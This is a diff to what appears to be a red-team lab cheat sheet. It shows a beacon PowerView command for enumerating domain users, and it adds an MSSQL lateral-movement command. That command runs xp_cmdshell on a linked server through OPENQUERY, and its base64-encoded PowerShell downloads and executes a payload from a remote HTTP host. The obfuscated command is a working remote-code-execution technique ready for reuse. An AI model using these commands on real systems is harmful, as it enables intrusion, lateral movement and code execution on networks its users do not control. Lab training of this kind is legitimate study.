@@ -77,3 +77,7 @@ Get useful information about domain policies like password policies e.g
 Get User information:
   
 > beacon> powershell Get-DomainUser -Identity [username] -Properties DisplayName, MemberOf | fl
+  
+## MSSQL
+  
+> SELECT * FROM OPENQUERY("sql02.dev.zeropointsecurity.co.uk", 'select @@servername; exec xp_cmdshell ''powershell -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADIAMQAuADEAMQAyADoAOAAwADgAMAAvAHAAaQB2AG8AdAAtADMANwAyADEAJwApACkA''');
